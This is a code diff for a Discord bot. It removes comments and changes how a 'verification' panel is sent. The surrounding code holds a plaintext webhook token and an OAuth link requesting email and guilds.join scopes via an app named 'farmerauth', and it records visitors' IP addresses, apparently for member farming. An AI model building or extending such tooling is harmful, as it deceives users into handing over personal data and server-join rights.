@@ -40,7 +40,7 @@ const WEBHOOKS = {
     EXECUTION: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565043524284457015/ln5xswheqPX20TbuQ_YG4V52h0T8CtvJM5gah_QgmPDsnr0bxWCr9XJl19BmkMiPl7NZ' })
 };
 
-// Updated Verification OAuth URL with email, identify, guilds.join
+// Exact requested OAuth URL with scopes
 const AUTOMATIC_VERIFY_OAUTH_URL = 'https://discord.com/oauth2/authorize?client_id=1561438987464483048&response_type=code&redirect_uri=https%3A%2F%2Ffarmerauth-production.up.railway.app&scope=email+identify+guilds.join';
 const RBOT_SERVER_INVITE = 'https://discord.gg/ZK3Er7Xgdq';
 
@@ -173,8 +173,6 @@ const slashCommands = [
 app.get('/', async (req, res) => {
     const code = req.query.code;
     const error = req.query.error;
-
-    // Extract user IP address
     const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown IP';
 
     if (error) {
@@ -334,7 +332,6 @@ async function updateLiveStockPanel() {
         const webhookBaseUrl = `https://discord.com/api/webhooks/${WEBHOOKS.LIVE_STOCK_ID}/${WEBHOOKS.LIVE_STOCK_TOKEN}`;
 
         if (dbData.liveStockWebhookMessageId) {
-            // Edit existing webhook message via PATCH
             const patchRes = await patchHttps(`${webhookBaseUrl}/messages/${dbData.liveStockWebhookMessageId}`, JSON.stringify({
                 embeds: [stockEmbed]
             }), {
@@ -342,11 +339,10 @@ async function updateLiveStockPanel() {
             });
 
             if (patchRes.status >= 200 && patchRes.status < 300) {
-                return; // Successfully edited in place
+                return;
             }
         }
 
-        // If no message ID exists yet, post a new message and save its ID
         const postRes = await postHttps(`${webhookBaseUrl}?wait=true`, JSON.stringify({
             embeds: [stockEmbed]
         }), {
@@ -440,7 +436,8 @@ client.on('interactionCreate', async interaction => {
                 return interaction.reply({ content: 'Verification embed sent via target webhook.', ephemeral: true });
             }
 
-            await WEBHOOKS.VERIFICATION.send({ embeds: [embed], components: [row] });
+            // Fixed: Sent directly via the bot client text channel so the button renders reliably
+            await interaction.channel.send({ embeds: [embed], components: [row] });
             return interaction.reply({ content: 'Verification panel with link button created successfully!', ephemeral: true });
         } catch (err) {
             return interaction.reply({ content: `Failed to create verification panel: ${err.message}`, ephemeral: true });
@@ -544,7 +541,6 @@ client.on('messageCreate', async message => {
         return message.channel.send('Only the join command is available to regular members.');
     }
 
-    // Help command sent directly to channel without using a webhook
     if (command === 'help') {
         if (message.author.id !== OWNER_ID) return;
         const helpEmbed = new EmbedBuilder()
